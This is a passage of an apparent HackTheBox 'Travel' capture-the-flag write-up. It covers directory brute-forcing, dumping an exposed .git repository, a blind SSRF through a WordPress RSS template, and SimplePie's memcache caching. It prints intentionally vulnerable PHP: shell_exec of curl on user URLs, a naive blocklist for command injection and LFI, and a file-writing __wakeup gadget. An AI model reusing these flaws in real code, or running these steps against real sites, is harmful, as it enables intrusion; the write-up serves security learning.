RSS feature" src="https://user-images.githubusercontent.com/9076747/83331326-c52b5680-a295-11ea-9798-be3fd6689868.png"><p>Let’s move on. First we can fire <code>gobuster</code> to see if it can find interesting directories. </p><p><code>http://blog.travel.htb</code> didn’t returned any interesting content, nothing more than common wordpress folder. <code>wpscan</code> didn’t find any vulnerability in the Wordpress version used nor in any plugins or themes.</p><h3 id="Git-Repository-Disclosure"><a href="#Git-Repository-Disclosure" class="headerlink" title="Git Repository Disclosure"></a>Git Repository Disclosure</h3><p>Upon running <code>gobuster</code> on <code>http://blog-dev.travel.htb</code> an interesting folder shows up:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://blog-dev.travel.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.git (Status: 301)</span><br></pre></td></tr></table></figure><p>Looks like someone accidentally let the project Git repository open and accessible. </p><p>If you are comfortable with Git inner-working, you are aware that Git will create a <code>.git</code> folder at the root of every projects it handle. This folder contains all the informations necessary for versioning the project, including all the information about commits, remote repository address, etc.<br>It also contains logs that stores the files commit history to be able to roll back to history at any moment.</p><p>Here is a good <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">explanation</a> on how it works behind the hood.</p><p>Alright! So with the right <a href="https://github.com/internetwache/GitTools">tools</a> we should be able to easily dump the whole content of the repository.<br>Let’s use <code>GitTools</code> for this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ bash gitdumper.sh http://blog-dev.travel.htb/.git/ blog-dev-dump</span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># GitDumper is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line">[+] Downloaded: HEAD</span><br><span class="line">[-] Downloaded: objects/info/packs</span><br><span class="line">[+] Downloaded: description</span><br><span class="line">[+] Downloaded: config</span><br><span class="line">[+] Downloaded: COMMIT_EDITMSG</span><br><span class="line">[+] Downloaded: index</span><br><span class="line">[-] Downloaded: packed-refs</span><br><span class="line">[+] Downloaded: refs/heads/master</span><br><span class="line">[-] Downloaded: refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: refs/stash</span><br><span class="line">[+] Downloaded: logs/HEAD</span><br><span class="line">[+] Downloaded: logs/refs/heads/master</span><br><span class="line">[-] Downloaded: logs/refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: info/refs</span><br><span class="line">[+] Downloaded: info/exclude</span><br><span class="line">[+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63</span><br><span class="line">[-] Downloaded: objects/00/00000000000000000000000000000000000000</span><br><span class="line">[+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f</span><br><span class="line">[+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9</span><br><span class="line">[+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039</span><br><span class="line">[+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da</span><br></pre></td></tr></table></figure><p>Bingo! looks like we managed to access a few files here. Let’s now run <code>git reset</code> to get the file content:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">log</span></span><br><span class="line">commit 0313850ae948d71767aff2cc8cc0f87a0feeef63 (HEAD -&gt; master)</span><br><span class="line">Author: jane &lt;jane@travel.htb&gt;</span><br><span class="line">Date:   Tue Apr 21 01:34:54 2020 -0700</span><br><span class="line"></span><br><span class="line">    moved to git</span><br><span class="line">    </span><br><span class="line">[hg8@archbook ~]$ git reset --hard</span><br><span class="line">HEAD is now at 0313850 moved to git</span><br><span class="line">hugo@archpen:/home/hugo/hackthebox/travel/blog-dev-dump git:(master) $ ls</span><br><span class="line">README.md  rss_template.php  template.php</span><br></pre></td></tr></table></figure><p>According to the <code>README.md</code> file this is an extension to show RSS inside a Wordpress page:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat README.md</span><br><span class="line"><span class="comment"># Rss Template Extension</span></span><br><span class="line"></span><br><span class="line">Allows rss-feeds to be shown on a custom wordpress page.</span><br><span class="line"></span><br><span class="line"><span class="comment">## Setup</span></span><br><span class="line"></span><br><span class="line">\ `git <span class="built_in">clone</span> https://github.com/WordPress/WordPress.git`</span><br><span class="line">* copy rss_template.php &amp; template.php to `wp-content/themes/twentytwenty`</span><br><span class="line">* create logs directory <span class="keyword">in</span> `wp-content/themes/twentytwenty`</span><br><span class="line">* create page <span class="keyword">in</span> backend and choose rss_template.php as theme</span><br><span class="line"></span><br><span class="line"><span class="comment">## Changelog</span></span><br><span class="line"></span><br><span class="line">- temporarily disabled cache compression</span><br><span class="line">- added additional security checks</span><br><span class="line">- added caching</span><br><span class="line">- added rss template</span><br><span class="line"></span><br><span class="line"><span class="comment">## ToDo</span></span><br><span class="line"></span><br><span class="line">- finish logging implementation% </span><br></pre></td></tr></table></figure><p>This is probably what is being used on the “Awesome RSS” page we found earlier on <code>http://blog.travel.htb/awesone-rss/</code>.</p><p>The <code>README.md</code> gives us additional information that might come useful later:</p><ul><li><code>rss_template.php</code> and <code>template.php</code> files we just found should be located in <code>wp-content/themes/twentytwenty</code>.</li><li>A <code>logs</code> folder exist at <code>wp-content/themes/twentytwenty/logs</code>.</li><li>The RSS have security checks, probably meaning it handle user input at some points.</li><li>Something get cached somewhere.</li></ul><p>With those information in mind let’s continue our investigations.</p><h3 id="RSS-Template"><a href="#RSS-Template" class="headerlink" title="RSS Template"></a>RSS Template</h3><p>Let’s take a deeper look at the two php files we recovered. First <code>rss_template.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Template Name: Awesome RSS</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;template.php&#x27;</span>);</span><br><span class="line">get_header();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;main <span class="class"><span class="keyword">class</span>=&quot;<span class="title">section</span>-<span class="title">inner</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"> <span class="title">function</span> <span class="title">get_feed</span>($<span class="title">url</span>)</span>&#123;</span><br><span class="line">     <span class="keyword">require_once</span> ABSPATH . <span class="string">&#x27;/wp-includes/class-simplepie.php&#x27;</span>;</span><br><span class="line">     <span class="variable">$simplepie</span> = <span class="literal">null</span>;</span><br><span class="line">     <span class="variable">$data</span> = url_get_contents(<span class="variable">$url</span>);</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$url</span>) &#123;</span><br><span class="line">         <span class="variable">$simplepie</span> = <span class="keyword">new</span> SimplePie();</span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;set_cache_location(<span class="string">&#x27;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#x27;</span>);</span><br><span class="line">         <span class="comment">//$simplepie-&gt;set_raw_data($data);</span></span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;set_feed_url(<span class="variable">$url</span>);</span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;init();</span><br><span class="line">         <span class="variable">$simplepie</span>-&gt;handle_content_type();</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$simplepie</span>-&gt;error) &#123;</span><br><span class="line">             error_log(<span class="variable">$simplepie</span>-&gt;error);</span><br><span class="line">             <span class="variable">$simplepie</span> = <span class="literal">null</span>;</span><br><span class="line">             <span class="variable">$failed</span> = <span class="literal">True</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$simplepie</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">     <span class="keyword">if</span>(strpos(<span class="variable">$url</span>, <span class="string">&quot;custom_feed_url&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">         <span class="variable">$tmp</span> = (explode(<span class="string">&quot;=&quot;</span>, <span class="variable">$url</span>));</span><br><span class="line">          <span class="variable">$url</span> = end(<span class="variable">$tmp</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable">$url</span> = <span class="string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$feed</span> = get_feed(<span class="variable">$url</span>);</span><br><span class="line">[...]</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/main&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">DEBUG</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;debug.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> get_template_part( <span class="string">&#x27;template-parts/footer-menus-widgets&#x27;</span> ); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">get_footer();</span><br></pre></td></tr></table></figure><p>Alright so this file gives us a lot of informations on what going on. To resume:</p><ul><li>This is the template used at <code>http://blog.travel.htb/awesome-rss/</code>.</li><li>The RSS is parsed using a library named <code>SimplePie</code>.</li><li>Something seems to be cached (probably the feed content?) into a local instance of <code>memcached</code>.</li><li>It’s possible to provide a custom RSS feed link to the page using <code>custom_feed_url</code> parameter.</li><li>There is a <code>debug.php</code> file located at <code>wp-content/themes/twentytwenty/debug.php</code></li></ul><p>Let’s now take a look at <code>template.php</code> which get included in <code>rss_template.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> <span class="doctag">Todo:</span> finish logging implementation via TemplateHelper</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">// this should be secure</span></span><br><span class="line">        <span class="variable">$tmpUrl</span> = urldecode(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;file://&quot;</span>) !== <span class="literal">false</span> <span class="keyword">or</span> strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;@&quot;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;-o&quot;</span>) !== <span class="literal">false</span> <span class="keyword">or</span> strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;-F&quot;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmp</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">        <span class="comment">// preventing all localhost access</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$tmp</span> == <span class="string">&quot;localhost&quot;</span> <span class="keyword">or</span> <span class="variable">$tmp</span> == <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$url</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">url_get_contents</span> (<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = safe(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = escapeshellarg(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$pl</span> = <span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>;</span><br><span class="line">        <span class="variable">$output</span> = shell_exec(<span class="variable">$pl</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemplateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        file_put_contents(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/logs/&#x27;</span>.<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The file is mainly used to retrieve remote RSS file using <code>curl</code>. In addition there is a few “security” check to make sure the parsing of custom RSS url doesn’t get abused. </p><p>Well now that’s a lot of informations. Let’s put everything together to see if we can progress.</p><h3 id="Blind-SSRF-With-Custom-RSS-Feed"><a href="#Blind-SSRF-With-Custom-RSS-Feed" class="headerlink" title="Blind SSRF With Custom RSS Feed"></a>Blind SSRF With Custom RSS Feed</h3><p>First thing I wanted to try was to check this <code>custom_feed_url</code> function.</p><p>Let’s create a valid RSS file and host it on our machine using Python server:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>RSS Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">description</span>&gt;</span>This is an example of an RSS feed<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://www.example.com/main.html<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 06 Sep 2010 00:01:00 +0000 <span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Sun, 06 Sep 2009 16:20:00 +0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ttl</span>&gt;</span>1800<span class="tag">&lt;/<span class="name">ttl</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Example entry<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Here is some text containing an interesting description.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://www.example.com/blog/post/1<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Sun, 06 Sep 2009 16:20:00 +0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>Now navigating to <code>http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.14.18:8000/sample.xml</code> indeed display our custom RSS feed:</p><img width="1030" alt="travel custom rss" src="https://user-images.githubusercontent.com/9076747/83437662-69510100-a440-11ea-98a4-3d8ac8af6d79.png"><p>And we can see a new request have been made to our web server from the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.189 - - [5/May/2020 19:44:38] <span class="string">&quot;GET /sample.xml HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><p>That’s good, we got Blind SSRF (Server Side Request Forgery)!</p><p>But what now? With Blind SSRF only we can’t do much yet. Since we can’t even read local files using <code>file://</code>…</p><p>Let’s continue to review what we found so far to see if it can be linked with that SSRF.</p><h3 id="Debug-php"><a href="#Debug-php" class="headerlink" title="Debug.php"></a>Debug.php</h3><p>I then got curious about `debug.php file. Maybe it can leak juicy informations ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.17.6</span><br><span class="line">Content-Length: 132</span><br><span class="line">X-Powered-By: PHP/7.3.16</span><br><span class="line"></span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure><p>Well that’s not very helpful. Yet while looking around and testing various things I got the <code>debug</code> to throw some informations. Indeed just after calling a <code>custom_feed_url</code> with the debug parameter we get the following:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url=http://10.10.14.18:8000/sample.xml&quot;</span> -s &gt; /dev/null</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ curl http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.17.6</span><br><span class="line">Content-Length: 198</span><br><span class="line">X-Powered-By: PHP/7.3.16</span><br><span class="line"></span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">| xct_a0e937ab19(...) | a:4:&#123;s:5:<span class="string">&quot;child&quot;</span>;a:1:&#123;s:0:<span class="string">&quot;&quot;</span>;a:1:&#123;(...) |</span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure><p>Both output are truncated, yet we notice the <code>xct_</code> prefix here, if you remember we saw it being used by <code>SimplePie</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$simplepie</span>-&gt;set_cache_location(<span class="string">&#x27;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#x27;</span>);</span><br></pre></td></tr></table></figure><p>SimplePie documentation explains:</p><blockquote><p> To use Memcache for SimplePie’s cache, simply set your cache location with a memcache.</p><p>For example, <code>memcache://localhost:11211/?timeout=3600&amp;prefix=sp_</code> will connect to memcache on localhost on port 11211. All tables will be prefixed with sp_ and data will expire after 3600 seconds.</p><p><a href="https://simplepie.org/api/class-SimplePie_Cache_Memcache.html">https://simplepie.org/api/class-SimplePie_Cache_Memcache.html</a></p></blockquote><p>Reading through SimplePie <code>memcache.php</code> <a href="https://simplepie.org/api/source-class-SimplePie_Cache_Memcache.html#102">source code</a> we understand the given prefix is used to generated the <code>memcached</code> entry key:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;name = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;extras&#x27;</span>][<span class="string">&#x27;prefix&#x27;</span>] . md5(<span class="string">&quot;<span class="subst">$name</span>:<span class="subst">$type</span>&quot;</span>);</span><br></pre></td></tr></table></figure><p>In addition, still reading through the source code of SimplePie we see that it’s serialize data and save it in the <code>memcached</code> entry. Once loading RSS from cache it will unserialize the stored data:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Save data to the cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array|SimplePie $data Data to store in the cache. If passed a SimplePie object, only cache the $data property</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool Successfulness</span></span><br><span class="line"><span class="comment"> 